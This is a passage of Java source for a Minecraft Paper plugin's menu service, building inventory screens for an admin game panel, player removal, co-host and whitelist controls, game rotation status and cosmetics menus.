package au.com.testplex.modern.menu;

import au.com.testplex.modern.model.ArcadeCatalog;
import au.com.testplex.modern.model.CosmeticLineDefinition;
import au.com.testplex.modern.model.CosmeticOption;
import au.com.testplex.modern.model.GameDefinition;
import au.com.testplex.modern.player.PlayerPreferenceStore;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/** Simple modern inventory UI. Game-specific renderers are registered alongside each port. */
public final class MenuService implements Listener {
    private static final String PANEL_TITLE = "Game Panel";
    private static final String SET_GAME_TITLE = "Set Game";
    private static final String GAME_OPTIONS_TITLE = "Game Options";
    private static final String REMOVE_PLAYER_TITLE = "Remove Player";
    private static final String UNREMOVE_PLAYER_TITLE = "Un-Remove Player";
    private static final String COHOST_ADD_TITLE = "Give Co-Host";
    private static final String COHOST_REMOVE_TITLE = "Remove Co-Host";
    private static final String WHITELIST_TITLE = "Whitelisted Players";
    private static final String VOTING_TITLE = "Rotation Status";
    private static final String CORE_COSMETICS_TITLE = "Cosmetics";
    private static final String COSMETICS_TITLE = "Arcade Cosmetics | Games";
    private static final String GAME_TITLE = "Arcade Cosmetics | Game | ";
    private static final String LINES_TITLE = "Arcade Cosmetics | Feature | ";
    private static final String OPTIONS_TITLE = "Arcade Cosmetics | Setting | ";
    private static final String WINS_TITLE = "Arcade Cosmetics | Win Effects | ";
    private static final String WIN_HOME_TITLE = "Arcade Cosmetics | Win Effects";
    private static final int[] LEGACY_GAME_SLOTS = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};

    private final JavaPlugin plugin;
    private final ArcadeCatalog catalog;
    private final PlayerPreferenceStore preferences;
    private final NamespacedKey actionKey;
    private final NamespacedKey gameKey;
    private final NamespacedKey lineKey;
    private final NamespacedKey optionKey;
    private final NamespacedKey targetKey;

    public MenuService(JavaPlugin plugin, ArcadeCatalog catalog, PlayerPreferenceStore preferences) {
        this.plugin = plugin;
        this.catalog = catalog;
        this.preferences = preferences;
        actionKey = new NamespacedKey(plugin, "menu-action");
        gameKey = new NamespacedKey(plugin, "game-id");
        lineKey = new NamespacedKey(plugin, "line-id");
        optionKey = new NamespacedKey(plugin, "option-id");
        targetKey = new NamespacedKey(plugin, "panel-target");
    }

    /** Legacy Game Panel geometry from Reborn's four-row MenuPage. */
    public void openGamePanel(Player player) {
        if (!isAdmin(player)) {
            player.sendMessage(ChatColor.RED + "Operator permission required to open the Game Panel.");
            return;
        }
        Inventory inventory = Bukkit.createInventory(null, 36, PANEL_TITLE);
        inventory.setItem(4, makeItem(Material.BEACON,
                ChatColor.GREEN + "" + ChatColor.BOLD + "Testplex Arcade Game Panel",
                List.of(" ",
                        ChatColor.YELLOW + "Players Online: " + ChatColor.WHITE + Bukkit.getOnlinePlayers().size(),
                        ChatColor.YELLOW + "Players Max: " + ChatColor.WHITE + Bukkit.getMaxPlayers(),
                        ChatColor.GRAY + "Use this panel to select games and maps.")));
        // Slots mirror the host-side 1.8 MenuPage exactly.
        panelButton(inventory, 9, Material.EMERALD_BLOCK, "Start Game", "panel-start");
        panelButton(inventory, 18, Material.REDSTONE_BLOCK, "Stop Game", "panel-stop");
        panelButton(inventory, 15, Material.LAVA_BUCKET, "Remove Player", "panel-remove");
        panelButton(inventory, 11, Material.WRITABLE_BOOK, "Set Game", "panel-set-game");
        panelButton(inventory, 20, Material.BOOK, "Edit Game Rotation", "panel-rotation");
        panelButton(inventory, 17, Material.COMPARATOR, "Game Options", "panel-options");
        panelButton(inventory, 24, Material.WATER_BUCKET, "Un-Remove Player", "panel-unremove");
        panelButton(inventory, 13, Material.DIAMOND_SWORD, "Give Co-Host", "panel-cohost-add");
        panelButton(inventory, 22, Material.GOLDEN_SWORD, "Remove Co-Host", "panel-cohost-remove");
        panelButton(inventory, 26, Material.TNT, "Kill Private Server", "panel-kill-server");
        panelButton(inventory, 30, Material.BOOKSHELF, "Rotation Status", "panel-voting");
        panelButton(inventory, 32, Material.PAPER, "Whitelisted Players", "panel-whitelist");
        player.openInventory(inventory);
    }

    private void panelButton(Inventory inventory, int slot, Material material, String label, String action) {
        List<String> lore = "Start Game".equals(label)
                ? List.of(ChatColor.GRAY + "Click to start after the lobby countdown.",
                        ChatColor.YELLOW + "Shift-click to start immediately.")
                : List.of(ChatColor.GRAY + "Click to open.");
        ItemStack item = makeItem(material, label, lore);
        mark(item, action, null, null, null);
        inventory.setItem(slot, item);
    }

    private JavaPlugin arcadeMechanicsPlugin() {
        org.bukkit.plugin.Plugin candidate = Bukkit.getPluginManager().getPlugin("ArcadeMechanicsModern");
        return candidate instanceof JavaPlugin engine && candidate.isEnabled() ? engine : null;
    }

    /**
     * The Arcade mechanics engine is a separate plugin JAR. Keep this menu module
     * decoupled from its compile-time classes while using the engine's authoritative
     * map/acceptance eligibility check when the API is present.
     */
    private boolean rotationCandidateAvailable(JavaPlugin engine, String gameId) {
        if (engine == null || gameId == null) return false;
        try {
            Object result = engine.getClass()
                    .getMethod("isRotationCandidateAvailable", String.class)
                    .invoke(engine, gameId);
            return Boolean.TRUE.equals(result);
        } catch (ReflectiveOperationException | RuntimeException exception) {
            plugin.getLogger().warning("Could not query Arcade rotation eligibility for "
                    + gameId + ": " + exception.getMessage());
            return false;
        }
    }

    private boolean gameOptionEnabled(String id) {
        return switch (id) {
            case "public-server" -> !Bukkit.hasWhitelist();
            case "enforce-whitelist" -> Bukkit.hasWhitelist();
            case "game-auto-start" -> {
                JavaPlugin engine = arcadeMechanicsPlugin();
                yield engine != null && engine.getConfig().getBoolean(
                        "game-preferences.automatic-rotation.enabled", false);
            }
            default -> false;
        };
    }

    private void openGameOptions(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, GAME_OPTIONS_TITLE);
        String[] ids = {"public-server", "enforce-whitelist", "game-auto-start"};
        String[] labels = {"Public Server", "Enforce Whitelist", "Automatic Game Rotation"};
        Material[] materials = {Material.ENDER_EYE, Material.PAPER, Material.COMPASS};
        int[] slots = {11, 15, 31};
        JavaPlugin engine = arcadeMechanicsPlugin();
        for (int i = 0; i < ids.length; i++) {
            boolean available = !"game-auto-start".equals(ids[i]) || engine != null;
            boolean enabled = gameOptionEnabled(ids[i]);
            String state = !available ? ChatColor.RED + "Unavailable"
                    : enabled ? ChatColor.GREEN + "Enabled" : ChatColor.RED + "Disabled";
            String description = switch (ids[i]) {
                case "public-server" -> "Public access is enabled when the server whitelist is off.";
                case "enforce-whitelist" -> "Only whitelisted players may join.";
                default -> "Runs preference-weighted rotation after each completed round.";
            };
            ItemStack item = makeItem(available ? materials[i] : Material.BARRIER,
                    (enabled && available ? ChatColor.GREEN : available ? ChatColor.RED : ChatColor.GRAY)
                            + labels[i],
                    List.of(state, ChatColor.GRAY + description,
                            ChatColor.YELLOW + "Click to change."));
            mark(item, "panel-option-toggle", null, null, ids[i]);
            inventory.setItem(slots[i], item);
            inventory.setItem(slots[i] + 9, makeItem(Material.GRAY_STAINED_GLASS_PANE,
                    (enabled && available ? ChatColor.GREEN : ChatColor.RED) + labels[i],
                    List.of(state)));
        }
        inventory.setItem(4, backItem("Go Back", "back-panel", null));
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        player.openInventory(inventory);
    }

    private void openPlayerList(Player viewer, boolean unremove) {
        String title = unremove ? UNREMOVE_PLAYER_TITLE : REMOVE_PLAYER_TITLE;
        Inventory inventory = Bukkit.createInventory(null, 54, title);
        int slot = 0;
        if (unremove) {
            for (String record : plugin.getConfig().getStringList("panel-blocked-players")) {
                String[] parts = record.split("\\|", 2);
                String uuid = parts[0];
                String name = parts.length > 1 ? parts[1] : uuid;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.YELLOW + name,
                        List.of(ChatColor.GRAY + "Click to restore access."));
                markTarget(item, "panel-unremove-target", uuid, name);
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        } else {
            for (Player target : Bukkit.getOnlinePlayers()) {
                if (target.getUniqueId().equals(viewer.getUniqueId())) continue;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.RED + target.getName(),
                        List.of(ChatColor.GRAY + "Click to remove this player from the test server."));
                markTarget(item, "panel-kick-target", target.getUniqueId().toString(), target.getName());
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        }
        if (slot == 0) inventory.setItem(22, makeItem(Material.BARRIER,
                ChatColor.GRAY + (unremove ? "No removed players" : "No other players online"), List.of()));
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        playerInventoryOpen(viewer, inventory);
    }

    private void playerInventoryOpen(Player viewer, Inventory inventory) {
        viewer.openInventory(inventory);
    }

    private void markTarget(ItemStack item, String action, String targetUuid, String targetName) {
        ItemMeta meta = item.getItemMeta();
        meta.getPersistentDataContainer().set(actionKey, PersistentDataType.STRING, action);
        meta.getPersistentDataContainer().set(targetKey, PersistentDataType.STRING, targetUuid);
        meta.getPersistentDataContainer().set(optionKey, PersistentDataType.STRING, targetName);
        item.setItemMeta(meta);
    }

    private void openCohostList(Player viewer, boolean remove) {
        Inventory inventory = Bukkit.createInventory(null, 54, remove ? COHOST_REMOVE_TITLE : COHOST_ADD_TITLE);
        int slot = 0;
        if (remove) {
            for (String record : plugin.getConfig().getStringList("panel-cohosts")) {
                String[] parts = record.split("\\|", 2);
                String uuid = parts[0];
                String name = parts.length > 1 ? parts[1] : uuid;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.YELLOW + name,
                        List.of(ChatColor.GRAY + "Click to remove co-host access."));
                markTarget(item, "panel-cohost-remove-target", uuid, name);
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        } else {
            for (Player target : Bukkit.getOnlinePlayers()) {
                if (target.getUniqueId().equals(viewer.getUniqueId())) continue;
                if (isCohost(target.getUniqueId())) continue;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.GREEN + target.getName(),
                        List.of(ChatColor.GRAY + "Click to grant co-host controls."));
                markTarget(item, "panel-cohost-add-target", target.getUniqueId().toString(), target.getName());
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        }
        if (slot == 0) inventory.setItem(22, makeItem(Material.BARRIER,
                ChatColor.GRAY + (remove ? "No co-hosts configured" : "No eligible players online"), List.of()));
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        viewer.openInventory(inventory);
    }

    private boolean isCohost(java.util.UUID uuid) {
        String prefix = uuid.toString();
        return plugin.getConfig().getStringList("panel-cohosts").stream()
                .anyMatch(record -> record.equals(prefix) || record.startsWith(prefix + "|"));
    }

    private void openWhitelistPage(Player viewer) {
        Inventory inventory = Bukkit.createInventory(null, 54, WHITELIST_TITLE);
        int slot = 0;
        for (Player target : Bukkit.getOnlinePlayers()) {
            boolean whitelisted = target.isWhitelisted();
            ItemStack item = makeItem(Material.PLAYER_HEAD,
                    (whitelisted ? ChatColor.GREEN : ChatColor.RED) + target.getName(),
                    List.of(whitelisted ? ChatColor.GREEN + "Whitelisted" : ChatColor.RED + "Not whitelisted",
                            ChatColor.YELLOW + "Click to toggle the server whitelist entry."));
            markTarget(item, "panel-whitelist-toggle", target.getUniqueId().toString(), target.getName());
            inventory.setItem(slot++, item);
            if (slot >= 45) break;
        }
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        viewer.openInventory(inventory);
    }

    private void openGameVoting(Player viewer) {
        openGameVoting(viewer, 0);
    }

    private void openGameVoting(Player viewer, int requestedPage) {
        Inventory inventory = Bukkit.createInventory(null, 54, VOTING_TITLE);
        JavaPlugin engine = arcadeMechanicsPlugin();
        if (engine == null) {
            inventory.setItem(22, makeItem(Material.BARRIER, ChatColor.RED + "Arcade engine unavailable",
                    List.of(ChatColor.GRAY + "ArcadeMechanicsModern is not enabled.")));
        } else {
            List<String> cleared = engine.getConfig().getStringList("enabled-games");
            String poolPath = "game-preferences.automatic-rotation.enabled-games";
            List<String> rotation = engine.getConfig().contains(poolPath)
                    ? engine.getConfig().getStringList(poolPath) : cleared;
            boolean automatic = engine.getConfig().getBoolean("game-preferences.automatic-rotation.enabled", false);
            inventory.setItem(4, makeItem(Material.COMPASS,
                    ChatColor.AQUA + "" + ChatColor.BOLD + "Preference-weighted Rotation",
                    List.of(ChatColor.GRAY + "Automatic rotation: "
                                    + (automatic ? ChatColor.GREEN + "Enabled" : ChatColor.RED + "Disabled"),
                            ChatColor.GRAY + "Minimum players: " + ChatColor.WHITE
                                    + engine.getConfig().getInt("game-preferences.automatic-rotation.minimum-players", 6),
                            ChatColor.GRAY + "Vote window: " + ChatColor.WHITE
                                    + engine.getConfig().getInt("game-preferences.automatic-rotation.vote-seconds", 60) + " seconds",
                            ChatColor.YELLOW + "Players rate games in /gamepreferences.")));

            List<GameDefinition> clearedGames = catalog.getGames().stream()
                    .filter(game -> cleared.contains(game.getId()))
                    .filter(game -> !isMonsterMazeModeAlias(game))
                    .sorted(java.util.Comparator.comparing(GameDefinition::getName,
                            String.CASE_INSENSITIVE_ORDER))
                    .toList();
            int[] slots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};
            int pageCount = Math.max(1, (clearedGames.size() + slots.length - 1) / slots.length);
            int page = Math.max(0, Math.min(requestedPage, pageCount - 1));
            int start = page * slots.length;
            int end = Math.min(clearedGames.size(), start + slots.length);
            for (int index = start; index < end; index++) {
                GameDefinition game = clearedGames.get(index);
                boolean included = rotation.contains(game.getId());
                boolean available = rotationCandidateAvailable(engine, game.getId());
                ItemStack item = makeItem(icon(game.getIcon()),
                        (included ? available ? ChatColor.GREEN : ChatColor.RED : ChatColor.YELLOW)
                                + game.getName(),
                        List.of(ChatColor.GRAY + "Acceptance status: " + ChatColor.GREEN + "Cleared",
                                ChatColor.GRAY + "Rotation pool: "
                                        + (included ? ChatColor.GREEN + "Included" : ChatColor.RED + "Excluded"),
                                ChatColor.GRAY + "Selected map availability: "
                                        + (available ? ChatColor.GREEN + "Ready" : ChatColor.RED + "Missing / invalid"),
                                ChatColor.DARK_GRAY + "Likelihood is shown in Game Preferences."));
                inventory.setItem(slots[index - start], item);
            }
            if (clearedGames.isEmpty()) inventory.setItem(22, makeItem(Material.BARRIER,
                    ChatColor.RED + "No games cleared for acceptance",
                    List.of(ChatColor.GRAY + "The reviewed 26.3 acceptance allow-list is empty.")));
            if (page > 0) {
                ItemStack previous = makeItem(Material.ARROW, ChatColor.YELLOW + "Previous Page", List.of());
                mark(previous, "panel-rotation-status-page", null, null, String.valueOf(page - 1));
                inventory.setItem(46, previous);
            }
            if (page + 1 < pageCount) {
                ItemStack next = makeItem(Material.ARROW, ChatColor.YELLOW + "Next Page", List.of());
                mark(next, "panel-rotation-status-page", null, null, String.valueOf(page + 1));
                inventory.setItem(52, next);
            }
            inventory.setItem(48, makeItem(Material.MAP, ChatColor.AQUA + "Page " + (page + 1) + "/" + pageCount,
                    List.of(ChatColor.GRAY.toString() + clearedGames.size() + " cleared game(s) in this status list.")));
        }
        inventory.setItem(45, backItem("Go Back", "back-panel", null));
        inventory.setItem(49, makeItem(Material.WRITABLE_BOOK, ChatColor.AQUA + "How voting works",
                List.of(ChatColor.GRAY + "Like / Dislike / Neutral ratings are collected",
                        ChatColor.GRAY + "through /gamepreferences and weighted together.",
                        ChatColor.YELLOW + "Edit Game Rotation controls the eligible pool.")));
        ItemStack preferences = makeItem(Material.WRITABLE_BOOK, ChatColor.GREEN + "Rate Games",
                List.of(ChatColor.GRAY + "Open your Like / Dislike / Neutral preferences.",
                        ChatColor.YELLOW + "Click to open Game Preferences."));
        mark(preferences, "panel-open-preferences", null, null, null);
        inventory.setItem(50, preferences);
        inventory.setItem(53, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        viewer.openInventory(inventory);
    }

    private void onPanelPlayerLogin(PlayerLoginEvent event) {
        String uuid = event.getPlayer().getUniqueId().toString();
        for (String record : plugin.getConfig().getStringList("panel-blocked-players")) {
            if (record.equals(uuid) || record.startsWith(uuid + "|")) {
                event.disallow(PlayerLoginEvent.Result.KICK_BANNED,
                        ChatColor.RED + "You were removed from this Testplex test server.");
                return;
            }
        }
    }



    public void openSetGamePage(Player player) {
        openGameSelection(player, false, 0);
    }

    private void openGameSelection(Player player, boolean rotation) {
        openGameSelection(player, rotation, 0);
    }

    private void openGameSelection(Player player, boolean rotation, int requestedPage) {
        Inventory inventory = Bukkit.createInventory(null, 54, rotation ? "Edit Game Rotation" : SET_GAME_TITLE);
        int[] slots = LEGACY_GAME_SLOTS;
        int pageCount = Math.max(1, (catalog.getGames().size() + slots.length - 1) / slots.length);
        int page = Math.max(0, Math.min(requestedPage, pageCount - 1));
        int start = page * slots.length;
        int end = Math.min(catalog.getGames().size(), start + slots.length);
        JavaPlugin engine = arcadeMechanicsPlugin();
        List<String> cleared = engine == null ? List.of() : engine.getConfig().getStringList("enabled-games");
        String rotationPath = "game-preferences.automatic-rotation.enabled-games";
        List<String> rotationPool = engine == null ? List.of()
                : engine.getConfig().contains(rotationPath)
                ? engine.getConfig().getStringList(rotationPath) : cleared;

        for (int index = start; index < end; index++) {
            GameDefinition game = catalog.getGames().get(index);
            boolean ready = cleared.contains(game.getId());
            boolean included = rotationPool.contains(game.getId());
            boolean rotationAvailable = engine != null && rotationCandidateAvailable(engine, game.getId());
            ChatColor colour = rotation
                    ? !ready ? ChatColor.RED
                    : included ? rotationAvailable ? ChatColor.GREEN : ChatColor.RED : ChatColor.YELLOW
                    : ready ? ChatColor.GREEN : ChatColor.WHITE;
            List<String> lore;
            if (rotation) {
                lore = List.of(
                        ChatColor.GRAY + "Acceptance status: " + (ready ? ChatColor.GREEN + "Cleared" : ChatColor.RED + "Not cleared"),
                        ChatColor.GRAY + "Rotation pool: " + (included ? ChatColor.GREEN + "Included" : ChatColor.RED + "Excluded"),
                        ChatColor.GRAY + "Selected map availability: " + (rotationAvailable
                                ? ChatColor.GREEN + "Ready" : ChatColor.RED + "Missing / invalid"),
                        ChatColor.YELLOW + "Click to " + (included ? "remove from" : "add to") + " rotation.",
                        ChatColor.DARK_GRAY + "The selector ignores games without an installed map.");
            } else {
                lore = List.of(ChatColor.RESET + ChatColor.GRAY.toString() + "Select this as the next lobby game.",
                        ChatColor.YELLOW + "Left-Click " + ChatColor.GRAY + "to select this game.",
                        ChatColor.YELLOW + "Right-Click " + ChatColor.GRAY + "to choose an installed map.",
                        ChatColor.DARK_GRAY + "Acceptance status: "
                                + (ready ? ChatColor.GREEN + "Cleared" : ChatColor.RED + "Not cleared"),
                        ChatColor.DARK_GRAY + "Port status: " + game.getPortStatus().getDisplay());
            }
            ItemStack item = makeItem(icon(game.getIcon()), colour + game.getName(), lore);
            mark(item, rotation ? "panel-rotation-select" : "panel-game-select",
                    game, null, rotation ? String.valueOf(page) : null);
            inventory.setItem(slots[index - start], item);
        }
        if (page > 0) {
            ItemStack previous = makeItem(Material.ARROW, ChatColor.YELLOW + "Previous Page",
                    List.of(ChatColor.GRAY + "Return to page " + page + "."));
            mark(previous, "panel-game-page", null, null, String.valueOf(page - 1));
            inventory.setItem(45, previous);
        }
        inventory.setItem(49, makeItem(Material.MAP, ChatColor.AQUA + "Page " + (page + 1) + "/" + pageCount,
                List.of(ChatColor.GRAY.toString() + catalog.getGames().size() + " games in the catalogue.",
                        ChatColor.GRAY + (rotation ? "Toggle games in the shared preference rotation pool."
                                : "Select any game to inspect its lobby integration."))));
        if (page + 1 < pageCount) {
            ItemStack next = makeItem(Material.ARROW, ChatColor.YELLOW + "Next Page",
                    List.of(ChatColor.GRAY + "Continue to page " + (page + 2) + "."));
            mark(next, "panel-game-page", null, null, String.valueOf(page + 1));
            inventory.setItem(53, next);
        }
        inventory.setItem(4, backItem("Go Back", "back-panel", null));
        player.openInventory(inventory);
    }

    /** ArcadeCosmeticsMenu's original 1.8 54-slot game grid and fixed slots. */
    /** Core Cosmetics screen ported from the 1.8 fixed-slot layout. */
    public void openCoreCosmeticsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, CORE_COSMETICS_TITLE);
        String[][] entries = {
                {"1","NETHER_STAR","Particle Effects","Show particles as you walk."},
                {"4","DIAMOND_SWORD","Weapon Names","Rename weapons in supported games."},
                {"7","GOLDEN_HELMET","Hats","Wear hats in supported lobbies."},
                {"10","ARROW","Arrow Effects","Change arrow trails."},
                {"13","CAKE","Win Effects","Choose a per-game win celebration."},
                {"16","DIAMOND_CHESTPLATE","Costumes","Wear a costume in supported lobbies."},
                {"19","SKELETON_SKULL","Death Animations","Choose a death animation."},
                {"21","TORCH","Game Cosmetics","Open per-game Arcade cosmetics."},
                {"22","DIAMOND","Power Play Club Rewards","View local Testplex options."},
                {"23","LEVER","Kit Selector Particles","Choose kit-selection particles."},
                {"25","LEATHER","Morphs","Choose a lobby morph."},
                {"28","GOLDEN_BOOTS","Double Jump Effects","Show double-jump effects."},
                {"31","NAME_TAG","Taunts","Choose taunts for supported games."},
                {"34","BANNER","Flags","Show a country flag in the lobby."},
                {"40","PAPER","Level Colors","Choose a level prefix colour."},
                {"47","LEAD","Balloons","Choose a lobby balloon."},
                {"48","MUSIC_DISC_13","Music","Choose lobby music."},
                {"49","MELON","Gadgets","Use supported lobby gadgets."},
                {"50","IRON_HORSE_ARMOR","Mounts","Choose a lobby mount."},
                {"51","BONE","Pets","Choose a lobby pet."}
        };
        for (String[] entry : entries) {
            ItemStack item = makeItem(icon(entry[1]), ChatColor.RESET + entry[2],
                    List.of(ChatColor.GRAY + entry[3], ChatColor.YELLOW + "Click to open."));
            mark(item, "core-category", null, null, entry[2].toLowerCase(Locale.ROOT).replace(' ', '-'));
            inventory.setItem(Integer.parseInt(entry[0]), item);
        }
        inventory.setItem(46, makeItem(Material.LIGHT_BLUE_STAINED_GLASS_PANE,
                ChatColor.AQUA + "Testplex Arcade Cosmetics",
                List.of(ChatColor.GRAY + "Production Mineplex Core ownership and donation services are not installed.")));
        ItemStack arcade = makeItem(Material.JUKEBOX,
                ChatColor.LIGHT_PURPLE + "" + ChatColor.BOLD + "Arcade Cosmetics",
                List.of(ChatColor.GRAY + "Open the per-game Arcade cosmetic lines.",
                        ChatColor.YELLOW + "Click to browse all Arcade games."));
        mark(arcade, "core-arcade-cosmetics", null, null, null);
        inventory.setItem(52, arcade);
        for (int slot = 0; slot < inventory.getSize(); slot++) {
            if (inventory.getItem(slot) == null) {
                inventory.setItem(slot, makeItem(Material.CYAN_STAINED_GLASS_PANE, ChatColor.DARK_GRAY + " ", List.of()));
            }
        }
        player.openInventory(inventory);
    }

    private void openCoreCosmeticInfo(Player player, String category) {
        Inventory inventory = Bukkit.createInventory(null, 27, "Cosmetics | " + category);
        inventory.setItem(13, makeItem(Material.BARRIER, ChatColor.RED + category + " not installed",
                List.of(ChatColor.GRAY + "The production Mineplex Core gadget/ownership backend",
                        ChatColor.GRAY + "is not part of this isolated Paper 26.3 server.",
                        ChatColor.YELLOW + "Use Arcade Cosmetics for available Testplex options.")));
        inventory.setItem(22, backItem("Back to Cosmetics", "back-core-cosmetics", null));
        player.openInventory(inventory);
    }

    private void openWinEffectsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, WIN_HOME_TITLE);
        int index = 0;
        for (GameDefinition game : catalog.getGames()) {
            if (isMonsterMazeModeAlias(game)) continue;
            if (index >= LEGACY_GAME_SLOTS.length) break;
            ItemStack item = makeItem(icon(game.getIcon()), ChatColor.YELLOW + game.getName(),
                    List.of(ChatColor.GRAY.toString() + game.getWinEffects().size() + " win-effect choices",
                            ChatColor.GREEN + "Click to configure"));
            mark(item, "win-effects-game", game, null, null);
            inventory.setItem(LEGACY_GAME_SLOTS[index++], item);
        }
        inventory.setItem(49, backItem("Back to Cosmetics", "back-core-cosmetics", null));
        player.openInventory(inventory);
    }

    public void openCosmeticsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, ChatColor.BLACK + COSMETICS_TITLE);
        int index = 0;
        int[] legacySlots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};
        for (GameDefinition game : catalog.getGames()) {
            if (isMonsterMazeModeAlias(game)) continue;
            if (index >= legacySlots.length) break;
            ItemStack item = makeItem(icon(game.getIcon()), ChatColor.YELLOW + game.getName(), List.of(
                    ChatColor.GRAY.toString() + game.getCosmeticLines().size()
                            + (game.getCosmeticLines().size() == 1 ? " cosmetic line" : " cosmetic lines"),
                    ChatColor.GRAY + "Win effects are managed separately in Cosmetics.",
                    ChatColor.GREEN + "Click to open"));
            mark(item, "game", game, null, null);
            inventory.setItem(legacySlots[index++], item);
        }
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close",
                List.of(ChatColor.GRAY + "Close the Arcade Cosmetics menu.")));
        player.openInventory(inventory);
    }

    private boolean isMonsterMazeModeAlias(GameDefinition game) {
        return game != null && ("monster-maze-speed".equals(game.getId())
                || "monster-maze-modern".equals(game.getId()));
    }

    /** Original ArcadeCosmeticsMenu game page: inset feature grid and back/close controls. */
    private void openGameDetails(Player player, GameDefinition game) {
        Inventory inventory = Bukkit.createInventory(null, 54, ChatColor.BLACK + GAME_TITLE + game.getId());
        int[] slots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34};
        int index = 0;
        for (CosmeticLineDefinition line : game.getCosmeticLines()) {
            if (index >= slots.length) break;
            Set<String> selected = preferences.getSelected(player.getUniqueId(), game, line);
            String equipped = selected.isEmpty() ? "Default" : selected.iterator().next();
            ItemStack item = makeItem(icon(line.getIcon()), ChatColor.YELLOW + line.getTitle(), List.of(
                    ChatColor.GRAY + line.getDescription(),
                    ChatColor.GRAY + (line.getSelectionMode() == CosmeticLineDefinition.SelectionMode.MULTI
                            ? "Enabled toggles: " + selected.size() : "Equipped: " + equipped),
                    ChatColor.GREEN + "Click to view options",
                    ChatColor.DARK_GRAY + "Feature: " + line.getId()));
            mark(item, "cosmetic-line", game, line, null);
            inventory.setItem(slots[index++], item);
        }
        inventory.setItem(45, backItem("Back to Games", "back-arcade-cosmetics", null));
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        ItemStack winItem = makeItem(Material.FIREWORK_ROCKET, ChatColor.GOLD + "Win Effects",
                List.of(ChatColor.GRAY + "Configure " + game.getName() + " win effect."));
        mark(winItem, "win-effects", game, null, null);
        inventory.setItem(51, winItem);
        player.openInventory(inventory);
    }

    private void openLines(Player player, GameDefinition game) {
        // The source Feature page is represented by the game's cosmetic-line grid.
        openGameDetails(player, game);
    }

    private void openOptions(Player player, GameDefinition game, CosmeticLineDefinition line) {
        Inventory inventory = Bukkit.createInventory(null, 27, OPTIONS_TITLE + game.getId() + " | " + line.getId());
        Set<String> selected = preferences.getSelected(player.getUniqueId(), game, line);
        int slot = 0;
        for (CosmeticOption option : line.getOptions()) {
            String selectionHint = line.getSelectionMode() == CosmeticLineDefinition.SelectionMode.SINGLE
                    ? ChatColor.YELLOW + "Click to equip"
                    : option.getSelectionGroup() == null
                            ? ChatColor.YELLOW + "Click to toggle"
                            : ChatColor.YELLOW + "Click to equip in " + option.getSelectionGroup();
            ItemStack item = makeItem(line.getIcon(),
                    (selected.contains(option.getId()) ? ChatColor.GREEN + "✓ " : ChatColor.WHITE) + option.getName(),
                    List.of(ChatColor.GRAY + option.getDescription(),
                            selected.contains(option.getId()) ? ChatColor.GREEN + "Selected" : ChatColor.GRAY + "Not selected",
                            selectionHint));
            mark(item, "cosmetic-option", game, line, option.getId());
            inventory.setItem(slot++, item);
        }
        inventory.setItem(22, backItem("Back to Cosmetic Lines", "back-lines", game));
        player.openInventory(inventory);
    }

    private void openWinEffects(Player player, GameDefinition game) {
        Inventory inventory = Bukkit.createInventory(null, 27, WINS_TITLE + game.getId());
        int slot = 0;
        String equipped = preferences.getWinEffect(player.getUniqueId(), game);
        for (CosmeticOption option : game.getWinEffects()) {
            ItemStack item = makeItem(Material.FIREWORK_ROCKET,
                    (equipped.equals(option.getId()) ? ChatColor.GREEN + "✓ " : ChatColor.WHITE) + option.getName(),
                    List.of(ChatColor.GRAY + option.getDescription(),
                            equipped.equals(option.getId()) ? ChatColor.GREEN + "Equipped" : ChatColor.YELLOW + "Click to equip"));
            mark(item, "win-option", game, null, option.getId());
            inventory.setItem(slot++, item);
        }
        inventory.setItem(22, backItem("Back to Cosmetic Lines", "back-lines", game));
        player.openInventory(inventory);
    }

    @EventHandler
    public void onBlockedPlayerLogin(PlayerLoginEvent event) {
        onPanelPlayerLogin(event);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        String title = ChatColor.stripColor(event.getView().getTitle());
        if (title == null || !(title.equals(PANEL_TITLE) || title.equals(SET_GAME_TITLE)
                || title.equals("Edit Game Rotation") || title.equals(GAME_OPTIONS_TITLE)
                || title.equals(REMOVE_PLAYER_TITLE) || title.equals(UNREMOVE_PLAYER_TITLE)
                || title.equals(COHOST_ADD_TITLE) || title.equals(COHOST_REMOVE_TITLE)
                || title.equals(WHITELIST_TITLE) || title.equals(VOTING_TITLE)
                || title.equals(CORE_COSMETICS_TITLE) || title.startsWith("Cosmetics | ")
                || title.startsWith("Arcade Cosmetics |"))) return;
